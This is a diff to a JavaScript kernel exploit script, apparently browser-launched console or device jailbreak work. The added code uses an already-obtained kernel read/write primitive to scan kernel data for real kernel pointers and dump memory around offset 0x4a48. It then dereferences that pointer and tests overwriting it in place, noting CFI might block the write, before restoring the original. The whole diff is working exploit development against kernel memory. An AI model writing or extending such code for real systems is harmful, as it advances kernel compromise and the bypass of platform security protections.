@@ -800,20 +800,113 @@ async function main(userlandRW, wkOnly = false) {
                     await log("========== WRITABLE REGION DUMP ==========", LogLevel.SUCCESS);
                     await log("[DUMP] Scanning 0x0 to 0x" + (exactBoundary + 0x1000).toString(16) + " for structures...", LogLevel.WARN);
 
-                    // Look for function pointers (values in kernel range 0xffffffff8xxxxxxx)
+                    // Look for REAL kernel pointers (filter out -1 and masks)
                     let foundPointers = [];
 
                     for (let off = 0; off < exactBoundary + 0x1000; off += 8) {
                         let val = await krw.read8(krw.kdataBase.add32(off));
 
-                        // Check if it looks like a kernel pointer
+                        // Filter criteria for REAL kernel pointers:
+                        // 1. High bits are 0xffffffff (kernel space)
+                        // 2. Low bits have 0x80000000 set (high kernel)
+                        // 3. NOT 0xffffffffffffffff (-1)
+                        // 4. NOT a mask pattern (lots of consecutive f's or 0's)
+
                         if (val.hi === 0xffffffff && (val.low & 0x80000000)) {
+                            // Filter out -1
+                            if (val.low === 0xffffffff) continue;
+
+                            // Filter out masks (if low has too many f's or 0's in a row)
+                            let lowHex = val.low.toString(16).padStart(8, '0');
+                            if (lowHex.match(/^f{4,}/) || lowHex.match(/0{4,}$/)) continue;
+
                             foundPointers.push({ offset: off, value: val });
-                            await log("[PTR] 0x" + off.toString(16) + ": " + val + " (potential kernel pointer!)", LogLevel.WARN);
+                            await log("[PTR] 0x" + off.toString(16) + ": " + val + " (REAL kernel pointer!)", LogLevel.SUCCESS);
                         }
                     }
 
-                    await log("[DUMP] Found " + foundPointers.length + " potential kernel pointers in writable region", LogLevel.SUCCESS);
+                    await log("[DUMP] Found " + foundPointers.length + " real kernel pointers in writable region", LogLevel.SUCCESS);
+
+                    // SPECIFIC INVESTIGATION: offset 0x4a48 had a real pointer!
+                    await log("========== INVESTIGATING 0x4a48 ==========", LogLevel.SUCCESS);
+
+                    // Dump context around 0x4a48
+                    await log("[0x4a48] Dumping context around the pointer:", LogLevel.INFO);
+                    for (let off = 0x4a00; off < 0x4b00; off += 8) {
+                        let val = await krw.read8(krw.kdataBase.add32(off));
+                        let marker = (off === 0x4a48) ? " <== TARGET" : "";
+                        await log("  0x" + off.toString(16) + ": " + val + marker, LogLevel.INFO);
+                    }
+
+                    // Read the pointer value
+                    let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
+                    await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.WARN);
+
+                    // Calculate what this pointer might be relative to ktextBase
+                    // ptr4a48 = 0xffffffffd134b000 (from user report)
+                    // ktextBase = 0xffffffff87fd0000 (from earlier)
+                    // Difference would tell us the offset into kernel
+
+                    await log("[0x4a48] Analyzing pointer target...", LogLevel.INFO);
+                    await log("[0x4a48] ktextBase: " + krw.ktextBase, LogLevel.INFO);
+
+                    // Try to read what the pointer points to
+                    await log("[0x4a48] Attempting to read target of pointer...", LogLevel.WARN);
+                    try {
+                        let targetVal = await krw.read8(ptr4a48);
+                        await log("[0x4a48] Target value: " + targetVal, LogLevel.SUCCESS);
+
+                        // Read more context at the target
+                        await log("[0x4a48] Target context:", LogLevel.INFO);
+                        for (let i = 0; i < 8; i++) {
+                            let v = await krw.read8(ptr4a48.add32(i * 8));
+                            await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
+                        }
+                    } catch (e) {
+                        await log("[0x4a48] Could not read target: " + e, LogLevel.ERROR);
+                    }
+
+                    // KEY QUESTION: Can we modify this pointer?
+                    await log("========== POINTER MODIFICATION TEST ==========", LogLevel.SUCCESS);
+
+                    let doPointerTest = confirm(
+                        "TEST: Modify pointer at 0x4a48?\n\n" +
+                        "Current value: " + ptr4a48 + "\n\n" +
+                        "This will:\n" +
+                        "1. Save current value\n" +
+                        "2. Write a test value\n" +
+                        "3. Verify it changed\n" +
+                        "4. Restore original\n\n" +
+                        "If CFI blocks this, it may crash.\n" +
+                        "If it works, we have a writable pointer!\n\n" +
+                        "OK = Test pointer modification\n" +
+                        "Cancel = Skip"
+                    );
+
+                    if (doPointerTest) {
+                        await log("[TEST] Saving original value...", LogLevel.INFO);
+                        let original = await krw.read8(krw.kdataBase.add32(0x4a48));
+
+                        await log("[TEST] Writing test value (original XOR 0x1000)...", LogLevel.WARN);
+                        let testVal = new int64(original.low ^ 0x1000, original.hi);
+                        await krw.write8(krw.kdataBase.add32(0x4a48), testVal);
+
+                        let verify = await krw.read8(krw.kdataBase.add32(0x4a48));
+                        await log("[TEST] Read back: " + verify, LogLevel.INFO);
+
+                        if (verify.low === testVal.low && verify.hi === testVal.hi) {
+                            await log("[TEST] SUCCESS! Pointer is WRITABLE!", LogLevel.SUCCESS);
+                            await log("[TEST] We can modify kernel pointers in this region!", LogLevel.SUCCESS);
+
+                            // Restore original
+                            await log("[TEST] Restoring original value...", LogLevel.INFO);
+                            await krw.write8(krw.kdataBase.add32(0x4a48), original);
+                            let restored = await krw.read8(krw.kdataBase.add32(0x4a48));
+                            await log("[TEST] Restored: " + restored, LogLevel.SUCCESS);
+                        } else {
+                            await log("[TEST] Write may have failed or been blocked", LogLevel.WARN);
+                        }
+                    }
 
                     // Also dump the SVM cache area specifically
                     await log("[SVM] Dumping SVM cache region (0x4b00-0x5000):", LogLevel.INFO);
